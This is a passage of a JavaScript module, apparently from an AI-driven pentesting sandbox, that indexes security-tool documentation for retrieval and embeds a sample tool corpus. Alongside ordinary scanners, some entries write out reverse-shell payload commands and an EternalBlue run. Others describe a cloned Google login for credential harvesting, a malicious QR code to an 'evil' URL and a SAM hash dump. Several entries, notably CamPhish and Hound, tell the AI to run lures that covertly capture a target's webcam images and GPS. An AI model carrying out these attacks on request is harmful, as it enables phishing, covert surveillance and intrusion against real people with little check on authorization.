import crypto from 'node:crypto';
import { query, isMemoryReady } from '../../db/index.js';
import { embed, embedOne, toVectorLiteral } from '../memory/embed.js';

const hash = (s) => crypto.createHash('sha1').update(s || '').digest('hex');
const clip = (s, n) => (s || '').toString().slice(0, n);

// Build the compact text we embed for retrieval (name + summary + key flags).
function embedText(t) {
  const flags = (t.help || t.help_text || '')
    .split('\n')
    .filter((l) => /^\s*-/.test(l))
    .slice(0, 20)
    .join('\n');
  return [t.name, t.category, t.summary, flags].filter(Boolean).join('\n').slice(0, 3000);
}

// Upsert a batch of tool docs (embeds in one call). items: {name,package,category,summary,help,man,example?}
export async function upsertToolDocs(items, source = 'extract') {
  if (!isMemoryReady() || !items?.length) return 0;
  const clean = items.filter((t) => t && t.name);
  let vectors;
  try {
    vectors = await embed(clean.map(embedText), 'passage');
  } catch {
    return 0;
  }
  let n = 0;
  for (let i = 0; i < clean.length; i++) {
    const t = clean[i];
    const help = clip(t.help ?? t.help_text, 6000);
    const ch = hash(`${t.summary}|${help}|${t.man}`);
    try {
      await query(
        `INSERT INTO tool_docs (name, package, category, summary, help_text, man_excerpt, example, source, content_hash, embedding, updated_at)
         VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10::vector, now())
         ON CONFLICT (name) DO UPDATE SET
           package=$2, category=$3, summary=$4, help_text=$5, man_excerpt=$6,
           example=COALESCE($7, tool_docs.example), source=$8, content_hash=$9, embedding=$10::vector, updated_at=now()`,
        [t.name, clip(t.package, 120), clip(t.category, 60), clip(t.summary, 1000), help,
         clip(t.man, 6000), t.example || null, source, ch, toVectorLiteral(vectors[i])]
      );
      n++;
    } catch (e) {
      console.warn('upsertToolDoc failed for', t.name, e.message);
    }
  }
  return n;
}

// Ingest NDJSON (one tool object per line). Batches embedding for efficiency.
export async function ingestNdjson(ndjson, { batch = 40 } = {}) {
  const lines = String(ndjson).split('\n').map((l) => l.trim()).filter(Boolean);
  let total = 0;
  for (let i = 0; i < lines.length; i += batch) {
    const items = [];
    for (const l of lines.slice(i, i + batch)) {
      try { items.push(JSON.parse(l)); } catch { /* skip bad line */ }
    }
    total += await upsertToolDocs(items, 'extract');
  }
  return total;
}

// Retrieve top-K tools relevant to a goal. Embedding search + keyword fallback.
export async function retrieveTools(queryText, k = 6) {
  if (!isMemoryReady() || !queryText?.trim()) return [];
  try {
    const qvec = await embedOne(queryText, 'query');
    const rows = await query(
      `SELECT name, category, summary, help_text, example,
              1 - (embedding <=> $1::vector) AS score
       FROM tool_docs
       ORDER BY embedding <=> $1::vector ASC LIMIT $2`,
      [toVectorLiteral(qvec), k]
    );
    if (rows.length) return rows;
  } catch (e) {
    console.warn('retrieveTools vector path failed:', e.message);
  }
  // Keyword fallback (works even when embeddings are in local-hash mode).
  const like = `%${queryText.toLowerCase().slice(0, 60)}%`;
  return query(
    `SELECT name, category, summary, help_text, example, 0 AS score
     FROM tool_docs
     WHERE lower(name) LIKE $1 OR lower(summary) LIKE $1 OR lower(help_text) LIKE $1
     LIMIT $2`,
    [like, k]
  );
}

export async function getTool(name) {
  return (await query(
    `SELECT name, package, category, summary, help_text, man_excerpt, example, source, updated_at
     FROM tool_docs WHERE name = $1`, [name]
  ))[0] || null;
}

export async function toolStats() {
  const [s] = await query(
    `SELECT COUNT(*)::int AS tools,
            COUNT(*) FILTER (WHERE example IS NOT NULL)::int AS with_example
     FROM tool_docs`
  );
  const cats = await query(
    `SELECT COALESCE(NULLIF(category,''),'uncategorized') AS category, COUNT(*)::int AS count
     FROM tool_docs GROUP BY 1 ORDER BY count DESC LIMIT 20`
  );
  return { ...s, categories: cats };
}

// A small built-in corpus so the index + retrieval are testable WITHOUT building the
// 20 GB image. Real docs come from the container extractor (Phase 18).
export const SAMPLE_TOOLS = [
  { name: 'nmap', category: 'recon', summary: 'Network exploration tool and security / port scanner.',
    help: '-sS SYN scan\n-sV service/version detection\n-p ports\n-A aggressive\n-O OS detection\n-oN output',
    example: 'nmap -sV -p- 127.0.0.1' },
  { name: 'masscan', category: 'recon', summary: 'Mass IP port scanner, very fast.',
    help: '-p ports\n--rate packets/sec\n-oG grepable output', example: 'masscan -p1-1000 127.0.0.1 --rate 1000' },
  { name: 'sqlmap', category: 'web', summary: 'Automatic SQL injection and database takeover tool.',
    help: '-u URL\n--dbs enumerate databases\n--batch noninteractive\n--risk\n--level', example: 'sqlmap -u "http://localhost/?id=1" --batch --dbs' },
  { name: 'hydra', category: 'password', summary: 'Parallelized network login cracker (brute force).',
    help: '-l user\n-L userlist\n-p pass\n-P passlist\nservice://host', example: 'hydra -l admin -P rockyou.txt ssh://127.0.0.1' },
  { name: 'gobuster', category: 'web', summary: 'Directory/file, DNS and vhost busting tool.',
    help: 'dir -u URL -w wordlist\ndns -d domain\nvhost', example: 'gobuster dir -u http://localhost -w /usr/share/wordlists/dirb/common.txt' },
  { name: 'nikto', category: 'web', summary: 'Web-server scanner: dangerous files, outdated software, misconfigurations, missing security headers, default creds. Prefer the ```vulnscan tag (its output auto-parses into findings). Slower than nuclei — bound big scans with -maxtime.',
    help: [
      'nikto -h http://192.168.1.10                 basic scan of a web server',
      'nikto -h http://example.com                  scan a site for common issues',
      'nikto -h http://example.com -p 8080          scan a specific port',
      'nikto -h http://example.com -ssl             force SSL/TLS mode',
      'nikto -h http://example.com -id admin:admin  HTTP basic-auth creds for the scan',
      'nikto -h http://example.com -Tuning 2        limit tests (see legend below)',
      'nikto -h http://example.com -o results.txt   save results to a file',
      'nikto -h http://example.com -Format html|csv|json|xml   export format (with -o)',
      'nikto -h http://example.com -Display V       verbose output',
      'nikto -h http://example.com -maxtime 120     cap scan time (seconds)',
      'nikto -h http://example.com -evasion 1       IDS evasion technique (1-8)',
      'nikto -h http://example.com -useragent "..." custom User-Agent',
      'nikto -h http://example.com -C all           force-check all CGI dirs',
      'nikto -h http://example.com -Plugins "@@ALL" run all plugins',
      '-Tuning legend: 1=interesting files 2=misconfig 3=info-disclosure 4=XSS/injection 5/7=remote-file',
      '  6=DoS 8=command-exec 9=SQLi a=auth-bypass b=software-id c=remote-source-incl x=reverse(exclude)',
    ].join('\n'),
    example: 'nikto -h http://target.com -Tuning 2389b -maxtime 120' },
  { name: 'crunch', category: 'password', summary: 'Wordlist generator where you can specify a character set.',
    help: 'min max charset\n-o output', example: 'crunch 6 8 abc123 -o wordlist.txt' },
  { name: 'cewl', category: 'password', summary: 'Custom wordlist generator that spiders a URL.',
    help: '-d depth\n-m min length\n-w write', example: 'cewl -d 2 -w words.txt http://localhost' },
  { name: 'john', category: 'password', summary: 'John the Ripper — offline password/hash cracker (dictionary, rules, incremental brute-force, single-crack). Identify the hash first with ```hashid (it gives the right --format). rockyou is pre-mounted at /usr/share/wordlists/rockyou.txt. Cracked passwords auto-parse into critical findings. Includes the *2john extractors for files.',
    help: [
      'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt   dictionary attack',
      'john --format=NT hashes.txt --wordlist=rockyou.txt           specify the hash format (from ```hashid)',
      'john --wordlist=rockyou.txt --rules hashes.txt               apply mangling rules (rockyou + mutations)',
      'john --single hashes.txt                                     single-crack (variations of the username)',
      'john --incremental hashes.txt                                pure brute-force (slow, last resort)',
      'john --show hashes.txt                                       display cracked passwords (user:pass)',
      'john --show --format=raw-md5 hashes.txt                      show, disambiguating the format',
      'john --status   /   john --restore                          check progress / resume a session',
      'john --list=formats                                          list all supported hash formats',
      '--- extract a crackable hash from a file (then feed to john): ---',
      'unshadow /etc/passwd /etc/shadow > hashes.txt                Linux login hashes',
      'zip2john file.zip > hash.txt   ·   rar2john file.rar > h.txt  password-protected archives',
      'ssh2john id_rsa > hash.txt   ·   pdf2john file.pdf > h.txt    encrypted key / PDF',
      'keepass2john db.kdbx > h.txt                                 KeePass database',
    ].join('\n'),
    example: 'john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt; john --show hashes.txt' },
  { name: 'ffuf', category: 'web', summary: 'Fast web fuzzer — the CLI equivalent of Burp Intruder. Brute-force dirs/files, parameters, values, vhosts, auth. Put FUZZ where you want to fuzz.',
    help: [
      'ffuf -u http://t/FUZZ -w wordlist.txt              directory/file discovery',
      'ffuf -u http://t/FUZZ -w wl -mc 200,301,403        match status codes',
      'ffuf -u http://t/FUZZ -w wl -fc 404 -fs 0          filter out code/size',
      'ffuf -u "http://t/?id=FUZZ" -w vals.txt            fuzz a parameter value (Intruder Sniper)',
      'ffuf -u http://t/ -H "Host: FUZZ" -w subs.txt      vhost fuzzing',
      'ffuf -w u:USER -w p:PASS -u http://t/login -X POST -d "user=USER&pass=PASS" -mode clusterbomb   creds spray',
      'ffuf ... -recursion -recursion-depth 2 -e .php,.bak  recurse + extensions',
      'ffuf ... -rate 100 -t 40 -o out.json -of json      rate/threads/output',
    ].join('\n'),
    example: 'ffuf -u http://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,403' },
  { name: 'zaproxy', category: 'vulnscan', summary: 'OWASP ZAP — the free, fully-CLI/headless equivalent of Burp Suite Scanner (Burp Community is GUI-only). Spiders + actively scans a web app and reports vulns (XSS, SQLi, headers, disclosure…). Run via ```vulnscan; its JSON report auto-parses into findings. On Kali the command is `zaproxy` (zap.sh is not on PATH; the zap-baseline.py wrapper is NOT installed).',
    help: [
      'zaproxy -cmd -quickurl http://target.com -quickout /root/zap.json -quickprogress   headless spider+active scan -> JSON report',
      '  then: cat /root/zap.json    (so the report reaches the findings parser)',
      'zaproxy -cmd -quickurl http://target.com -quickout /root/zap.html   HTML report instead',
      'daemon + API (for orchestration): zaproxy -daemon -host 127.0.0.1 -port 8090 -config api.disablekey=true',
      '  spider:  curl "http://127.0.0.1:8090/JSON/spider/action/scan/?url=http://target"',
      '  a-scan:  curl "http://127.0.0.1:8090/JSON/ascan/action/scan/?url=http://target"',
      '  report:  curl "http://127.0.0.1:8090/OTHER/core/other/jsonreport/" -o zap.json',
      'NOTE: -quickurl runs an ACTIVE (intrusive) scan — only against an authorized target, and it is SLOW',
      '  (many attack plugins). For a fast, safe pass use the daemon + spider + passive scan above, or bound',
      '  the active scan. Treat ZAP like a heavy scanner (minutes), not a quick check.',
    ].join('\n'),
    example: 'zaproxy -cmd -quickurl http://target.com -quickout /root/zap.json -quickprogress; cat /root/zap.json' },
  { name: 'burpsuite', category: 'web', summary: 'Burp Suite — the classic web-app proxy/scanner, but Community edition is GUI-ONLY (no CLI/headless; Pro/Enterprise headless needs a paid license). In this headless sandbox use the CLI equivalents instead: ZAP (```vulnscan / zap-baseline.py) for scanning, mitmproxy/mitmdump for intercept/replay, ffuf for Intruder-style fuzzing, curl/httpie for Repeater.',
    help: 'GUI only — not automatable here. Map Burp features:\nScanner->zaproxy · Proxy/Intercept->mitmproxy · Intruder->ffuf · Repeater->curl · Decoder->base64/curl', example: 'zaproxy -cmd -quickurl http://target.com -quickout /root/zap.json   # Burp-Scanner equivalent' },
  { name: 'tshark', category: 'network', summary: 'Wireshark CLI — packet capture & analysis. Prefer the built-in ```sniff tag (capture|creds|http|dns|hosts|protocols|read) which auto-detects the interface and, crucially, EXTRACTS CLEARTEXT CREDENTIALS (HTTP basic-auth [base64-decoded], GET/POST login params, FTP, Telnet, mail) into findings. Offline .pcap analysis works anywhere; live capture needs NET_RAW (sandbox has it) + a real interface (or the desktop machine).',
    help: [
      '```sniff capture [iface] [count]     live-capture to /tmp/sniff.pcap (auto-detects the interface)',
      '```sniff creds [pcap]                extract cleartext credentials from the capture',
      '```sniff http|dns|hosts [pcap]       HTTP requests / DNS queries / IP conversations',
      '```sniff protocols [pcap]            protocol hierarchy (what protocols are on the wire)',
      '```sniff read <pcap> <display-filter>   run any Wireshark display filter',
      '--- raw tshark ---',
      'tshark -i eth0 -w cap.pcap -c 1000        capture 1000 packets to a file',
      'tshark -r cap.pcap -Y "http.request"      display filter (HTTP requests)',
      'tshark -r cap.pcap -T fields -e ip.src -e ip.dst -e http.host   extract fields',
      'tshark -r cap.pcap -Y "http.authorization" -T fields -e http.authorization   basic-auth (base64)',
      'tshark -r cap.pcap -z io,phs -q           protocol hierarchy · -z conv,ip conversations',
      'tshark -f "tcp port 80" -i eth0           BPF capture filter · -c N count · -n no name-resolution · -x hex',
    ].join('\n'),
    example: 'tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri' },
  { name: 'tcpdump', category: 'network', summary: 'Classic CLI packet capture (BPF filters). Capture to a pcap, then analyze with ```sniff / tshark.',
    help: 'tcpdump -i eth0 -w cap.pcap\ntcpdump -i eth0 "tcp port 80" -c 100\ntcpdump -r cap.pcap -nn -A', example: 'tcpdump -i eth0 -w cap.pcap "port 80 or port 21"' },
  { name: 'mitmproxy', category: 'web', summary: 'Interactive TLS-capable intercepting proxy — the CLI equivalent of Burp Proxy. Intercept, inspect, modify and replay HTTP/S. mitmdump is the scriptable/headless version (Python addons) for automation.',
    help: [
      'mitmproxy --mode regular -p 8080                  interactive TUI proxy',
      'mitmdump -p 8080 -w flows.mitm                    headless capture to a file',
      'mitmdump -nr flows.mitm -s addon.py               replay a saved capture through a script',
      'mitmdump -p 8080 --set save_stream_file=out.mitm  save live stream',
      'mitmdump -s script.py                             run a Python addon (modify/observe requests)',
      'point the target/browser at http://<you>:8080 and trust the mitmproxy CA (mitm.it)',
    ].join('\n'),
    example: 'mitmdump -p 8080 -w flows.mitm   # then replay/inspect' },
  // --- the rest of the installed arsenal (curated for clean retrieval) ---
  { name: 'dnsrecon', category: 'recon', summary: 'DNS enumeration and reconnaissance (records, zone transfer, brute force subdomains).',
    help: '-d domain\n-t std|axfr|brt\n-D wordlist', example: 'dnsrecon -d example.com -t std' },
  { name: 'dnsenum', category: 'recon', summary: 'Comprehensive DNS recon for a domain: A/NS/MX records, subdomain brute-force, Google scraping, reverse lookups, netranges — and crucially it attempts a ZONE TRANSFER (AXFR) against each name server. Output auto-parses into findings (a successful zone transfer = high; discovered subdomains = asset inventory).',
    help: [
      'dnsenum example.com                       full automatic enumeration',
      'dnsenum --enum example.com                shortcut for a thorough scan (threads + whois + google)',
      'dnsenum -f /usr/share/wordlists/dnsmap.txt example.com   custom subdomain wordlist',
      'dnsenum --threads 10 example.com          more concurrency (faster)',
      'dnsenum -w example.com                    also WHOIS the class-C netranges',
      'dnsenum -o out.xml example.com            save results as XML',
      'dnsenum -p 5 -s 20 example.com            scrape up to 5 google pages / 20 subdomains',
      'dnsenum --dnsserver 8.8.8.8 example.com   query a specific DNS server',
      'dnsenum --private example.com             also list private (RFC1918) addresses',
      'dnsenum --noreverse example.com           skip reverse lookups (faster)',
      'TIP: a public AXFR zone transfer leaks EVERY internal hostname — always check for it.',
    ].join('\n'),
    example: 'dnsenum --enum --threads 10 example.com' },
  { name: 'whatweb', category: 'recon', summary: 'Identify websites: CMS, frameworks, server, JS libraries, versions.',
    help: '-a aggression\n-v verbose\n--log', example: 'whatweb -a 3 http://example.com' },
  { name: 'dirb', category: 'web', summary: 'Web content scanner — recursively brute-forces directories & files with a wordlist to find hidden admin panels, configs, backups, .git/.env, uploads. Found paths auto-parse into findings (sensitive ones flagged high/medium).',
    help: [
      'dirb http://target.com                              basic scan (default common.txt wordlist)',
      'dirb http://target.com /usr/share/wordlists/dirb/big.txt   use a specific wordlist',
      'dirb http://target.com -X .php,.txt,.bak,.config   also try these file extensions',
      'dirb http://target.com -x .ext                     extensions from a file',
      'dirb http://target.com -i                          case-insensitive',
      'dirb http://target.com -o results.txt              save output',
      'dirb http://target.com -a "Mozilla/5.0 ..."        custom User-Agent',
      'dirb http://target.com -u admin:password           HTTP basic auth',
      'dirb http://target.com -p http://127.0.0.1:8080    route through a proxy',
      'dirb http://target.com -z 100                      100ms delay between requests',
      'dirb http://target.com -N 403,404                  ignore these status codes',
      'dirb http://target.com -r                          non-recursive (top level only)',
    ].join('\n'),
    example: 'dirb http://target.com /usr/share/wordlists/dirb/common.txt -X .php,.bak,.config' },
  { name: 'wfuzz', category: 'web', summary: 'Web application fuzzer for brute-forcing params, dirs, forms, auth.',
    help: '-w wordlist\n-u URL with FUZZ\n--hc hide codes', example: 'wfuzz -w common.txt -u http://localhost/FUZZ' },
  { name: 'hashcat', category: 'password', summary: 'World\'s fastest GPU password hash cracker (many hash modes).',
    help: '-m mode\n-a attack\n-w workload', example: 'hashcat -m 0 -a 0 hashes.txt rockyou.txt' },
  { name: 'hash-identifier', category: 'password', summary: 'Identify the type/algorithm of a given password hash.',
    help: '(interactive; paste a hash)', example: 'echo 5f4dcc3b5aa765d61d8327deb882cf99 | hash-identifier' },
  { name: 'hashid', category: 'password', summary: 'Prefer the built-in ```hashid tag: names the hash algorithm(s) AND gives the exact hashcat -m mode + john format + ready crack command (bcrypt/sha512crypt/NTLM/NetNTLMv2/Kerberoast/JWT/MySQL5/…). Handles shadow/pwdump lines and ranks ambiguous bare-hex.',
    help: '```hashid <hash>  (one, many, or a shadow/pwdump line)', example: 'hashid $6$rounds=5000$salt$hash' },
  { name: 'pwnedpass', category: 'password', summary: 'Check if a password appears in known data breaches via HaveIBeenPwned "Pwned Passwords". DEFENSIVE + privacy-safe: k-anonymity — SHA-1 the password locally, send only the first 5 hex chars, match the rest locally (full password never leaves). Prefer the built-in ```pwnedpass tag — takes one password or a one-per-line list / uploaded .txt and returns an instant BREACHED/safe report with breach counts. Not gated (your own passwords).',
    help: [
      '```pwnedpass MyPassw0rd            check one password',
      '```pwnedpass  (then a list, one per line)   check many / an uploaded .txt',
      '--- the raw API it uses (k-anonymity): ---',
      'H=$(printf %s "pw" | sha1sum | cut -c1-40 | tr a-z A-Z); curl -s https://api.pwnedpasswords.com/range/${H:0:5} | grep -i ${H:5}',
    ].join('\n'),
    example: 'curl -s https://api.pwnedpasswords.com/range/76B18   # match your SHA-1 suffix in the response' },
  { name: 'name-that-hash', category: 'password', summary: 'CLI hash-type identifier (nth) with hashcat/john references — good fallback when a hash is unrecognised.',
    help: '-t "<hash>"\n-f file', example: 'nth --text "5f4dcc3b5aa765d61d8327deb882cf99"' },
  { name: 'camphish', category: 'social-engineering', summary: 'CamPhish — grab front-camera shots + GPS from a target\'s phone/PC by sending a link (techchipnet/CamPhish). Serves a lure page (Festival Wishing / Live YouTube TV / Online Meeting) over a public cloudflared tunnel; on camera-allow it silently snaps webcam images (cam*.png) + captures GPS/IP. Use the ```camphish tag: runs it as a LIVE job + returns the trycloudflare link; captured shots/locations become findings. Confirmed generating a real public link.',
    help: '```camphish [festival|youtube|meeting]   -> starts CamPhish + returns the public link\n```camphish read <job>                    -> watch for captured cam shots / GPS\nunder the hood: git clone https://github.com/techchipnet/CamPhish; bash camphish.sh (port-fwd 2=cloudflared)', example: 'camphish meeting   # "online meeting" lure, capture the target\'s camera' },
  { name: 'hound', category: 'osint', summary: 'Geolocation + device-recon tracker (techchipnet/hound). Serves a PHP page over a public cloudflared tunnel; when a target opens the link and allows location it captures their EXACT GPS coordinates + device intel (OS, model, CPU cores, screen res, browser, public IP, ISP). Use the built-in ```hound tag: it runs Hound as a LIVE background job and returns the trycloudflare.com link to deliver; captured locations become findings. Confirmed generating a real public link.',
    help: '```hound start            -> starts Hound + returns the public tracking link\n```hound read <job>        -> watch the live job for captured GPS/device data\nunder the hood: git clone https://github.com/techchipnet/hound; cd hound; bash hound.sh (needs php, wget, unzip)', example: 'hound start   # get a tracking link, deliver it, capture the target\'s GPS' },
  { name: 'setoolkit', category: 'social-engineering', summary: 'SET — the Social-Engineer Toolkit. Human-attack framework: clone login pages to harvest credentials, malicious QR codes, Windows/powershell payloads, web-jacking/tabnabbing phishing, infectious USB media, mass-mailer/spear-phishing. PREFER the built-in ```set tag (the user picks an attack by number and the AI drives SET non-interactively; harvester/phishing sites run as LIVE jobs that capture creds). Confirmed generating real QR + payload artifacts.',
    help: [
      '```set menu                         numbered attack list',
      '```set ip                           detect the user\'s IP (LHOST / harvester post-back)',
      '```set qrcode url=https://evil/login   malicious QR code -> that URL',
      '```set harvester lhost=<ip> url=https://accounts.google.com   clone the login + capture creds (LIVE)',
      '```set payload lhost=<ip> lport=4444   Windows meterpreter exe (or use ```msf)',
      '```set powershell-reverse lhost=<ip> lport=4444   powershell reverse shell',
      '```set powershell-sam               dump the local SAM hashes payload',
      'raw (interactive): setoolkit   — SET is menu-driven; the ```set tag automates the menu answers for you',
    ].join('\n'),
    example: 'set harvester lhost=192.168.1.50 url=https://accounts.google.com   # clone gmail login, capture creds' },
  { name: 'metasploit-framework', category: 'exploit', summary: 'The Metasploit framework — exploits, payloads, post modules. PREFER the built-in ```msf tag: the user picks an attack by number (or describes it) and you perform it — it builds the msfvenom payload with the user\'s OWN IP (to test on their device) and runs the multi/handler as a PERSISTENT background job so the session stays alive (no timeout). Manage listeners with ```msf sessions / read / send / stop.',
    help: [
      '```msf menu                        show the numbered attack menu',
      '```msf ip                          detect the user\'s IP (for LHOST)',
      '```msf 1 lhost=<ip> lport=4444     build attack #1 (Windows revshell) + start the handler',
      '```msf android lhost=<ip>          build an Android APK payload + handler',
      '```msf handler lport=4444          just start a persistent listener',
      '```msf 9 rhost=<target> lhost=<ip> run EternalBlue (gated: authorized target only)',
      '```msf sessions                    list live listeners/jobs · read <id> · send <id> <cmd> · stop <id>',
      'raw: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=.. LPORT=.. -f exe -o s.exe',
      'raw: msfconsole -q -x "use exploit/multi/handler; set PAYLOAD ..; run"   (started as a live job)',
    ].join('\n'),
    example: 'msf 1 lhost=192.168.1.50 lport=4444   # windows reverse shell + live handler' },
  { name: 'msfconsole', category: 'exploit', summary: 'Metasploit console — search/use exploits, set options, run against targets.',
    help: 'search\nuse\nset RHOSTS/LHOST\nexploit/run', example: 'msfconsole -q -x "use auxiliary/scanner/ssh/ssh_version; set RHOSTS 127.0.0.1; run; exit"' },
  { name: 'msfvenom', category: 'exploit', summary: 'Metasploit payload generator/encoder (reverse shells, meterpreter, etc.).',
    help: '-p payload\nLHOST= LPORT=\n-f format', example: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o sh.elf' },
  { name: 'searchsploit', category: 'exploit', summary: 'Search the Exploit-DB archive for public exploits and shellcode.',
    help: 'term\n-t title\n-x examine\n-m mirror', example: 'searchsploit apache 2.4.49' },
  { name: 'amass', category: 'recon', summary: 'In-depth attack-surface mapping and subdomain/asset enumeration.',
    help: 'enum -d domain\nintel\n-passive', example: 'amass enum -d example.com' },
  { name: 'masscan', category: 'recon', summary: 'Internet-scale TCP port scanner, extremely fast.',
    help: '-p ports\n--rate\n-oG output', example: 'masscan -p1-1000 127.0.0.1 --rate 1000' },
  { name: 'set', category: 'exploit', summary: 'Social-Engineer Toolkit: phishing, payloads, credential harvesting (lab use).',
    help: '(menu-driven)', example: 'setoolkit' },
  { name: 'exploitdb', category: 'exploit', summary: 'Local copy of the Exploit-DB exploit archive (searched via searchsploit).',
    help: 'searchsploit <term>', example: 'searchsploit -w wordpress' },
  // --- vulnerability scanners / exploitation (Phase E4) ---
  { name: 'nuclei', category: 'vulnscan', summary: 'Fast template-based vulnerability scanner (~13k CVE/CWE/OWASP/exposure/misconfig checks). Prefer the ```vulnscan tag (bare target auto-runs a clean JSON scan whose results become findings). Templates auto-download on first run; -update-templates refreshes them.',
    help: [
      'nuclei -u https://target.com                 scan one target',
      'nuclei -l targets.txt                         scan a list of targets',
      'nuclei -u URL -t templates/                   run specific templates',
      'nuclei -update-templates                      update the template DB',
      'nuclei -u URL -severity critical,high         only high/critical',
      'nuclei -u URL -tags cve                       CVE templates (also: exposure,misconfig,tech,takeover,lfi,xss,sqli)',
      'nuclei -u URL -id CVE-2021-44228              a specific template id (e.g. log4shell)',
      'nuclei -u URL -o results.txt                  save results to a file',
      'nuclei -l targets.txt -o out.txt              scan list + export',
      'nuclei -u URL -j (or -jsonl)                  JSON output (machine-parseable)',
      'nuclei -u URL -silent                         only show findings (no banner/logs)',
      'nuclei -u URL -stats                          live scan statistics',
      'nuclei -u URL -rate-limit 50 (-rl)            cap requests/sec (be polite / evade WAF)',
      'nuclei -list-templates (-tl)                  list available templates',
      'nuclei -u URL -severity info                  informational checks',
      'nuclei -u URL -t custom.yaml                  run a custom template file',
      'nuclei -u URL -duc                            disable the auto update-check (faster in CI/sandbox)',
    ].join('\n'),
    example: 'nuclei -u https://target.com -tags cve,exposure -severity high,critical -j -silent -rl 150' },
  { name: 'openvas', category: 'vulnscan', summary: 'OpenVAS/Greenbone full-blown network vulnerability scanner (thousands of NVTs).',
    help: 'gvm-setup (first run)\ngvm-start\ngvm-cli to drive scans', example: 'gvm-setup && gvm-start' },
  { name: 'gvm', category: 'vulnscan', summary: 'Greenbone Vulnerability Management — CLI/daemon front-end to the OpenVAS scanner.',
    help: 'gvm-cli socket --xml "<get_tasks/>"\ngvm-start\ngvm-check-setup', example: 'gvm-cli --gmp-username admin --gmp-password admin socket --xml "<get_version/>"' },
  { name: 'dalfox', category: 'web', summary: 'Powerful automated XSS scanner and parameter-analysis / exploitation tool.',
    help: 'url <URL>\npipe\nfile\n--custom-payload\n--blind', example: 'dalfox url "https://target.com/?q=test"' },
  { name: 'commix', category: 'web', summary: 'Automated OS command-injection detection and exploitation tool.',
    help: '-u URL\n--batch\n--os-cmd\n--all', example: 'commix -u "https://target.com/?ping=127.0.0.1" --batch' },
  { name: 'jwt_tool', category: 'web', summary: 'Toolkit to test, tamper, and exploit JSON Web Tokens (alg:none, key confusion, weak secrets).',
    help: '<jwt>\n-C crack\n-X attack\n-T tamper', example: 'jwt_tool <token> -C -d /usr/share/wordlists/rockyou.txt' },
  { name: 'ssrfmap', category: 'web', summary: 'Automatic SSRF fuzzer and exploitation (cloud metadata, port scan, file read).',
    help: '-r request.txt\n-p PARAM\n-m modules', example: 'ssrfmap -r req.txt -p url -m readfiles,portscan' },
  { name: 'ysoserial', category: 'exploit', summary: 'Generate Java deserialization gadget-chain payloads for RCE (CWE-502).',
    help: '<gadget> <command>', example: 'ysoserial CommonsCollections5 "id" > payload.bin' },
  { name: 'gitleaks', category: 'recon', summary: 'Scan source/git history for hard-coded secrets and credentials (CWE-798).',
    help: 'detect --source .\n-v', example: 'gitleaks detect --source . -v' },
  // --- DevSecOps / AppSec code-security suite (sast/sca/iac/container/config/secrets/supply-chain) ---
  { name: 'semgrep', category: 'sast', summary: 'Fast multi-language static analysis (SAST) for security bugs — injection, XSS, weak crypto, secrets.',
    help: '--config auto\n--json\n--severity ERROR\n--sarif', example: 'semgrep --config auto --json .' },
  { name: 'bandit', category: 'sast', summary: 'Static security analyzer for Python source (finds common insecure patterns).',
    help: '-r <dir>\n-f json\n-ll high', example: 'bandit -r . -f json' },
  { name: 'trivy', category: 'appsec', summary: 'All-in-one scanner: container images, filesystems, IaC/config misconfig, secrets, licenses, dependency CVEs.',
    help: 'image <img>\nfs <dir>\nconfig <dir>\n--scanners vuln,secret,misconfig,license\n--format json', example: 'trivy image --format json nginx:1.21' },
  { name: 'grype', category: 'appsec', summary: 'Vulnerability scanner for container images and filesystems (CVE matching against an SBOM).',
    help: 'dir:<path>\n<image>\n-o json', example: 'grype dir:. -o json' },
  { name: 'syft', category: 'appsec', summary: 'Generate a Software Bill of Materials (SBOM) — component/dependency + license inventory (SCA).',
    help: '<path>\n-o json\n-o cyclonedx-json\n-o spdx-json', example: 'syft . -o json' },
  { name: 'osv-scanner', category: 'appsec', summary: 'Google OSV dependency vulnerability scanner across every lockfile/manifest and SBOMs.',
    help: '-r <dir>\n--format json\n--sbom <file>', example: 'osv-scanner --format json -r .' },
  { name: 'checkov', category: 'appsec', summary: 'Infrastructure-as-Code static analysis (Terraform, CloudFormation, Kubernetes, ARM, Helm, Dockerfile).',
    help: '-d <dir>\n-o json\n--compact\n--framework terraform', example: 'checkov -d . -o json --compact' },
  { name: 'dockle', category: 'appsec', summary: 'Container image linter — checks Dockerfile/image against CIS Docker Benchmark & best practices.',
    help: '<image>\n-f json\n--exit-code 1', example: 'dockle -f json nginx:1.21' },
  // --- Cloud security posture (CSPM) ---
  { name: 'prowler', category: 'cloud', summary: 'AWS/Azure/GCP/Kubernetes security posture scanner — hundreds of CIS misconfig checks (public buckets, IAM, default creds, encryption, logging).',
    help: 'aws\nazure\ngcp\n-M json-ocsf\n-c <check>\n--severity critical,high', example: 'prowler aws -M json-ocsf' },
  { name: 'scoutsuite', category: 'cloud', summary: 'Multi-cloud (AWS/Azure/GCP/OCI) security auditing — HTML report of misconfigurations from account APIs.',
    help: 'aws\nazure\ngcp\n--report-dir', example: 'scout aws' },
  { name: 'cloud_enum', category: 'cloud', summary: 'Multi-cloud OSINT: enumerate public S3/GCS/Azure buckets, apps and functions by keyword.',
    help: '-k <keyword>\n--disable-azure\n-t threads', example: 'cloud_enum -k targetname' },
  { name: 's3scanner', category: 'cloud', summary: 'Scan for open/misconfigured S3 (and GCS) buckets and dump/enumerate their contents.',
    help: 'scan --bucket <name>\n-l list.txt', example: 's3scanner scan --bucket targetname-assets' },
  // --- live web secret exposure ---
  { name: 'trufflehog', category: 'secrets', summary: 'Find leaked credentials/secrets in filesystems, git history, and live web content (verified detectors).',
    help: 'filesystem <dir>\ngit <repo>\n--json\n--only-verified', example: 'trufflehog filesystem . --json' },
  { name: 'secretfinder', category: 'secrets', summary: 'Scan a web app\'s JavaScript files for API keys, tokens and secrets (regex + entropy).',
    help: '-i <url>\n-o cli\n-e (extract from all JS)', example: 'secretfinder -i https://target.com -o cli' },
  { name: 'linkfinder', category: 'recon', summary: 'Extract endpoints/paths hidden inside a web app\'s JavaScript files.',
    help: '-i <url>\n-o cli\n-d (deep/domain)', example: 'linkfinder -i https://target.com -o cli' },
